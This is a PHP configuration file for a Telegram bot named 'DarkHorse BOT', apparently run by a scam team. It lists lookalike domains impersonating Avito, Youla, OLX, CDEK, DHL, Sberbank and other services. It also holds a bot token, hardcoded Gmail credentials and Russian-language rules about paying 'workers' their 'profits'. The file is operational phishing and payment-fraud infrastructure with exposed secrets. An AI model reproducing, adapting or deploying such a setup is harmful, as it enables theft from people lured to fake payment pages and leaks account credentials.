<?php
  function secretKey() {
    return 'nscode';
  }

  function botToken() {
    return '1778245110:AAEX1_dFBFUqZudd8u4uscI-V5zlh84f1NY';
  }

  // Стикеры в сообщениях бота
  function Stickers($a) { 
    return [
    'profitchat' => 'CAACAgIAAxkBAAKvil__sMMvkxz2zOxemPvY-Q8CmBlhAAKKAgACVp29Cj5SbosTxUBnHgQ', //Стикер успешной оплаты в чат воркеров.
        'joinproject' => 'CAACAgIAAxkBAAKvh1__iQ98xZPCbOWe03R8SJ56iCjFAAKHAgACVp29CkLtdCtAV9CQHgQ', //Стикер при первом запуске бота.
        'joinrules' => 'CAACAgIAAxkBAAKvkF__yn10r0QZLwqb_X-auMTIeXuBAAJ4AgACVp29Cvy6CLWRfRwMHgQ', //Стикер "Правила проекта" при заявке.
        'joinwait' => 'CAACAgIAAxkBAAKvk1__1Dn8eDEJ9aKHuAZ6vBfgoY1iAAKQAgACVp29CjLSqXG41NC1HgQ', //Стикер при отправке заявки на вступление.
        'accessblock' => 'CAACAgIAAxkBAAKvjV__sgyAZDz5fOJmrgd8jXge_V-FAAKOAgACVp29CqnHEJVyxoY-HgQ', //Стикер если нет доступа.
        'buybot' => 'CAACAgIAAxkBAAKvll__3qcPOotV0XJqd-cQaMUL7FuGAAJzAgACVp29CqhzpawLQR7RHgQ',
        'profile' => 'CAACAgIAAxkBAAK20WAHOuMOWlkjvB7f4ePBQkERbsMaAAKJAgACVp29CqFWzQIhMg49HgQ',
      ][$a];
  }
  
  function botLogin() {
    return 'DarkHorseTeam_bot';
  }
  
  function prjName() {
    return 'DarkHorse BOT';
  }
  
  function linkChat() {
    return 'https://t.me/joinchat/m7r67_IE_2c0NDIy';
  }
  
  function linkPays() {
    return 'https://t.me/joinchat/m7r67_IE_2c0NDIy';
  }
  
  function chatGroup() {
    return '-1001229890767';
  }
  
  function chatAdmin() {
    return '-1001229890767';
  }
  
  function chatAlerts() {
    return '-1001229890767';
  }
  
  function chatProfits() {
    return '-1001229890767';
  }

  function activateRuchka() {
    return 14500;
  }

  function allDomains() {
    return [
      1 => ['t99960pr.beget.tech'],
     // 2 => ['youla.id438271.ru'],//
      //3 => ['boxberry.id438271.ru'],
      //4 => ['cdek.id438271.ru'],
      //5 => ['pochta.id438271.ru'],
      //6 => ['pecom3ds.id837855.ru'],
      //7 => ['yandex.id438271.ru'],
      //8 => ['dostavista.id438271.ru'],
      //9 => ['avitorent.id837855.ru'],
      ////10 => ['pony.id438271.ru'],
      //11 => ['dhl.id438271.ru'],
           //12 => ['cian.id438271.ru'],
            //13 => ['youla-rent.id438271.ru'],
            //14 => ['kufar.id438271.ru'],
            //15 => ['belpost.id438271.ru'],
           // 16 => ['blablacar.id438271.ru'],
           // 17 => ['sberbank.id837855.ru'],
           // 18 => ['АЛЬФАБАНК'],
           // 19 => ['drom3ds.id837855.ru'],
          ////  20 => ['avto3ds.id837855.ru'],
           // 21 => ['olxua.guardpay.online'],
          ////  22 => ['olxpl.guardpay.online'],
           // 23 => ['allergo.pl'],
           // 24 => ['olxro.guardpay.online'],
           // 25 => ['bazos.guardpay.online'],  // базос
          // 26 => ['cbazar.guardpay.online'], // цбазар
           // 27 => ['olxpt.guardpay.online'], // olx португалия
           // 28 => ['olxbg.guardpay.online'], // olx болгария
    ];
  }

  function imgurId() {
    return '9783c0d302010a0';
  }

  function allEmails() {
    return [
      1 => 'guarddeliverypay@gmail.com:Pomidor2132',
      2 => 'guarddeliverypay@gmail.com:Pomidor2132',
      3 => 'guarddeliverypay@gmail.com:Pomidor2132',
      4 => 'guarddeliverypay@gmail.com:Pomidor2132',
      5 => 'guarddeliverypay@gmail.com:Pomidor2132',
      6 => 'guarddeliverypay@gmail.com:Pomidor2132',
      7 => 'guarddeliverypay@gmail.com:Pomidor2132',
      8 => 'guarddeliverypay@gmail.com:Pomidor2132',
      9 => 'guarddeliverypay@gmail.com:Pomidor2132',
      10 => 'ЛОГИН@gmail.com:ПАРОЛЬ',
      11 => 'ЛОГИН@gmail.com:ПАРОЛЬ',
      12 => 'ЛОГИН@gmail.com:ПАРОЛЬ',
      13 => 'ЛОГИН@gmail.com:ПАРОЛЬ',
      14 => 'ЛОГИН@gmail.com:ПАРОЛЬ',
      15 => 'ЛОГИН@gmail.com:ПАРОЛЬ',
      16 => 'ЛОГИН@gmail.com:ПАРОЛЬ',
      17 => 'ЛОГИН@gmail.com:ПАРОЛЬ',
      18 => 'ЛОГИН@gmail.com:ПАРОЛЬ',
      19 => 'ЛОГИН@gmail.com:ПАРОЛЬ',
      20 => 'guarddeliverypay@gmail.com:Pomidor2132',
      21 => 'guarddeliverypay@gmail.com:Pomidor2132',
      22 => 'guarddeliverypay@gmail.com:Pomidor2132',
      23 => 'guarddeliverypay@gmail.com:Pomidor2132',
      24 => 'guarddeliverypay@gmail.com:Pomidor2132',
    ];
  }



  function authSmsRecv($a) {
    return [
      'shb' => 'ТОКЕН', // от smshub.org
    ][$a];
  }

    function authSmsSend($a) {
    return [
      'sms' => 'ЛОГИН:ПАРОЛЬ', // от sms.to
    ][$a];
  }

  function serviceRecvSms() {
    return 'shb';
  }

  function serviceSendSms() {
    return 'clk';
  }

  function showUserCard() {
    return true;
  }

  function accessSms() {
    return [10, 15000];
  }

  function kickLinkJoinedUsers() {
    return false;
  }

  function getRules() {
    return [
      '📜 <b>Наши правила:</b>',
      '',
      '1. В чате запрещена реклама, флуд, спам, недопустимый контент',
      '2. Профит заблокированного воркера либо не состоящего в чате не выплачивается',
      '3. Мы не несем ответственности за блокировку карт и кошельков',
      '',
    ];
  }

  function liveChatCode() {
return '<script>var _smartsupp = _smartsupp || {};_smartsupp.key = \'674cf9109bfa935c44b7d00ab203663fbce25f0a\';window.smartsupp||(function(d) {var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];s=d.getElementsByTagName(\'script\')[0];c=d.createElement(\'script\');c.type=\'text/javascript\';c.charset=\'utf-8\';c.async=true;c.src=\'https://www.smartsuppchat.com/loader.js?\';s.parentNode.insertBefore(c,s);})(document);</script>';
  }
?>